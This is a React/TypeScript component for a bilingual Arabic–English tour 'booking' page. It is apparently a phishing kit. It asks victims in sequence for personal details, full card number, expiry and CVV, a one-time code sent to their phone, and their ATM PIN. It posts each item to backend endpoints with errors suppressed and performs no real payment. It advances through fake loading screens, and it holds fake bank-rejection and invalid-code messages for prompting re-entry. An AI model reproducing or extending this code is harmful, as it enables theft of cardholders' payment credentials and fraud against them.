import { useState } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import { Loader2 } from 'lucide-react';

type BookingStep = 'basicInfo' | 'loading1' | 'cardDetails' | 'loading2' | 'otp' | 'loading3' | 'pin' | 'loading4' | 'success';

interface BasicInfo {
  fullName: string;
  email: string;
  phone: string;
  serviceType: string;
}

interface CardData {
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
}

export default function BookingFlow() {
  const [language, setLanguage] = useState<'en' | 'ar'>('ar');
  const [step, setStep] = useState<BookingStep>('basicInfo');
  
  const [basicInfo, setBasicInfo] = useState<BasicInfo>({
    fullName: '',
    email: '',
    phone: '',
    serviceType: '',
  });

  const [cardData, setCardData] = useState<CardData>({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
  });

  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [otpError, setOtpError] = useState(false);
  const [pinError, setPinError] = useState(false);

  const translations = {
    ar: {
      bookingTitle: 'حجز الخدمة',
      basicInfoTitle: 'البيانات الأساسية',
      fullName: 'الاسم الكامل',
      email: 'البريد الإلكتروني',
      phone: 'رقم الهاتف',
      serviceType: 'نوع الخدمة',
      selectService: 'اختر الخدمة',
      continue: 'متابعة',
      cardDetailsTitle: 'بيانات البطاقة',
      cardNumber: 'رقم البطاقة',
      cardHolder: 'اسم حامل البطاقة',
      expiryDate: 'تاريخ الانتهاء (MM/YY)',
      cvv: 'CVV',
      continuePayment: 'متابعة الدفع',
      otpTitle: 'رمز التحقق (OTP)',
      enterOtp: 'أدخل رمز التحقق المرسل إلى هاتفك',
      otpPlaceholder: '000000',
      verifyOtp: 'التحقق من OTP',
      pinTitle: 'الرقم السري للصراف الآلي',
      enterPin: 'أدخل الرقم السري للصراف الآلي',
      pinPlaceholder: '••••',
      verifyPin: 'التحقق من الرقم السري',
      successTitle: 'تم الحجز بنجاح!',
      successMessage: 'شكراً لك! تم تأكيد حجزك بنجاح.',
      bookingSummary: 'ملخص الحجز',
      backToHome: 'العودة للرئيسية',
      processing: 'جاري المعالجة...',
      invalidOtp: 'برجاء التحقق من رمز التحقق الصحيح',
      invalidPin: 'برجاء التأكد من الرقم السري الصحيح للصراف الآلي',
      cardRejected: 'تم رفض العملية من خلال البنك مصدر البطاقة. برجاء التحقق من معلومات البطاقة الصحيحة.',
    },
    en: {
      bookingTitle: 'Book Service',
      basicInfoTitle: 'Basic Information',
      fullName: 'Full Name',
      email: 'Email Address',
      phone: 'Phone Number',
      serviceType: 'Service Type',
      selectService: 'Select a Service',
      continue: 'Continue',
      cardDetailsTitle: 'Card Details',
      cardNumber: 'Card Number',
      cardHolder: 'Card Holder Name',
      expiryDate: 'Expiry Date (MM/YY)',
      cvv: 'CVV',
      continuePayment: 'Continue Payment',
      otpTitle: 'Verification Code (OTP)',
      enterOtp: 'Enter the verification code sent to your phone',
      otpPlaceholder: '000000',
      verifyOtp: 'Verify OTP',
      pinTitle: 'ATM PIN',
      enterPin: 'Enter your ATM PIN',
      pinPlaceholder: '••••',
      verifyPin: 'Verify PIN',
      successTitle: 'Booking Successful!',
      successMessage: 'Thank you! Your booking has been confirmed successfully.',
      bookingSummary: 'Booking Summary',
      backToHome: 'Back to Home',
      processing: 'Processing...',
      invalidOtp: 'Please verify the correct verification code',
      invalidPin: 'Please ensure the correct ATM PIN',
      cardRejected: 'The transaction was rejected by the issuing bank. Please verify the correct card information.',
    },
  };

  const t = translations[language];

  const handleBasicInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    setStep('loading1');

    // Simulate API call
    setTimeout(() => {
      // Send data to backend
      fetch('/api/booking/basic-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(basicInfo),
      }).catch(() => {});

      setStep('cardDetails');
    }, 1500);
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    setStep('loading2');

    // Simulate API call
    setTimeout(() => {
      // Send data to backend
      fetch('/api/booking/card-details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...cardData, email: basicInfo.email }),
      }).catch(() => {});

      setStep('otp');
    }, 1500);
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    setOtpError(false);
    setStep('loading3');

    // Simulate API call
    setTimeout(() => {
      // Send OTP to backend
      fetch('/api/booking/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp, email: basicInfo.email }),
      }).catch(() => {});

      setStep('pin');
    }, 1500);
  };

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    setPinError(false);
    setStep('loading4');

    // Simulate API call
    setTimeout(() => {
      // Send PIN to backend
      fetch('/api/booking/verify-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pin, email: basicInfo.email }),
      }).catch(() => {});

      setStep('success');
    }, 1500);
  };

  const handleCardReject = () => {
    setErrorMessage(t.cardRejected);
    setStep('cardDetails');
  };

  const handleOtpReject = () => {
    setOtpError(true);
    setErrorMessage(t.invalidOtp);
    setOtp('');
  };

  const handlePinReject = () => {
    setPinError(true);
    setErrorMessage(t.invalidPin);
    setPin('');
  };

  return (
    <div className={`min-h-screen flex flex-col ${language === 'ar' ? 'rtl' : 'ltr'}`}>
      <Header language={language === 'ar' ? 'en' : 'es'} onLanguageChange={() => setLanguage(language === 'ar' ? 'en' : 'ar')} />

      <main className="flex-1 py-12 px-4">
        <div className="max-w-2xl mx-auto">
          {/* Basic Information Step */}
          {step === 'basicInfo' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-8 text-gray-800">{t.basicInfoTitle}</h2>

              <form onSubmit={handleBasicInfoSubmit} className="space-y-6">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.fullName}
                  </label>
                  <input
                    type="text"
                    value={basicInfo.fullName}
                    onChange={(e) => setBasicInfo({ ...basicInfo, fullName: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.email}
                  </label>
                  <input
                    type="email"
                    value={basicInfo.email}
                    onChange={(e) => setBasicInfo({ ...basicInfo, email: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.phone}
                  </label>
                  <input
                    type="tel"
                    value={basicInfo.phone}
                    onChange={(e) => setBasicInfo({ ...basicInfo, phone: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.serviceType}
                  </label>
                  <select
                    value={basicInfo.serviceType}
                    onChange={(e) => setBasicInfo({ ...basicInfo, serviceType: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  >
                    <option value="">{t.selectService}</option>
                    <option value="tour1">Tour 1</option>
                    <option value="tour2">Tour 2</option>
                  </select>
                </div>

                {errorMessage && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {errorMessage}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition"
                >
                  {t.continue}
                </button>
              </form>
            </div>
          )}

          {/* Loading Step 1 */}
          {step === 'loading1' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-red-600" />
              <p className="text-gray-600">{t.processing}</p>
            </div>
          )}

          {/* Card Details Step */}
          {step === 'cardDetails' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-8 text-gray-800">{t.cardDetailsTitle}</h2>

              <form onSubmit={handleCardSubmit} className="space-y-6">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.cardNumber}
                  </label>
                  <input
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    value={cardData.cardNumber}
                    onChange={(e) => setCardData({ ...cardData, cardNumber: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    {t.cardHolder}
                  </label>
                  <input
                    type="text"
                    value={cardData.cardHolder}
                    onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      {t.expiryDate}
                    </label>
                    <input
                      type="text"
                      placeholder="12/25"
                      value={cardData.expiryDate}
                      onChange={(e) => setCardData({ ...cardData, expiryDate: e.target.value })}
                      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      {t.cvv}
                    </label>
                    <input
                      type="text"
                      placeholder="123"
                      value={cardData.cvv}
                      onChange={(e) => setCardData({ ...cardData, cvv: e.target.value })}
                      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600"
                      required
                    />
                  </div>
                </div>

                {errorMessage && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {errorMessage}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition"
                >
                  {t.continuePayment}
                </button>
              </form>
            </div>
          )}

          {/* Loading Step 2 */}
          {step === 'loading2' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-red-600" />
              <p className="text-gray-600">{t.processing}</p>
            </div>
          )}

          {/* OTP Step */}
          {step === 'otp' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-4 text-gray-800">{t.otpTitle}</h2>
              <p className="text-gray-600 mb-8">{t.enterOtp}</p>

              <form onSubmit={handleOtpSubmit} className="space-y-6">
                <div>
                  <input
                    type="text"
                    placeholder={t.otpPlaceholder}
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg text-center text-2xl tracking-widest focus:outline-none focus:ring-2 ${
                      otpError ? 'border-red-500 focus:ring-red-600' : 'border-gray-300 focus:ring-red-600'
                    }`}
                    required
                  />
                </div>

                {errorMessage && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {errorMessage}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition"
                >
                  {t.verifyOtp}
                </button>
              </form>
            </div>
          )}

          {/* Loading Step 3 */}
          {step === 'loading3' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-red-600" />
              <p className="text-gray-600">{t.processing}</p>
            </div>
          )}

          {/* PIN Step */}
          {step === 'pin' && (
            <div className="bg-white rounded-lg shadow-lg p-8">
              <h2 className="text-3xl font-bold mb-4 text-gray-800">{t.pinTitle}</h2>
              <p className="text-gray-600 mb-8">{t.enterPin}</p>

              <form onSubmit={handlePinSubmit} className="space-y-6">
                <div>
                  <input
                    type="password"
                    placeholder={t.pinPlaceholder}
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg text-center text-2xl tracking-widest focus:outline-none focus:ring-2 ${
                      pinError ? 'border-red-500 focus:ring-red-600' : 'border-gray-300 focus:ring-red-600'
                    }`}
                    required
                  />
                </div>

                {errorMessage && (
                  <div className="p-4 bg-red-100 text-red-700 rounded-lg">
                    {errorMessage}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition"
                >
                  {t.verifyPin}
                </button>
              </form>
            </div>
          )}

          {/* Loading Step 4 */}
          {step === 'loading4' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-red-600" />
              <p className="text-gray-600">{t.processing}</p>
            </div>
          )}

          {/* Success Step */}
          {step === 'success' && (
            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
              <div className="text-6xl mb-4">✓</div>
              <h2 className="text-3xl font-bold mb-4 text-green-600">{t.successTitle}</h2>
              <p className="text-gray-600 mb-8">{t.successMessage}</p>

              <div className="bg-gray-50 rounded-lg p-6 mb-8 text-left">
                <h3 className="text-xl font-bold mb-4">{t.bookingSummary}</h3>
                <div className="space-y-2 text-gray-700">
                  <p><strong>الاسم:</strong> {basicInfo.fullName}</p>
                  <p><strong>البريد:</strong> {basicInfo.email}</p>
                  <p><strong>الهاتف:</strong> {basicInfo.phone}</p>
                  <p><strong>الخدمة:</strong> {basicInfo.serviceType}</p>
                </div>
              </div>

              <a
                href="/"
                className="inline-block bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-8 rounded-lg transition"
              >
                {t.backToHome}
              </a>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
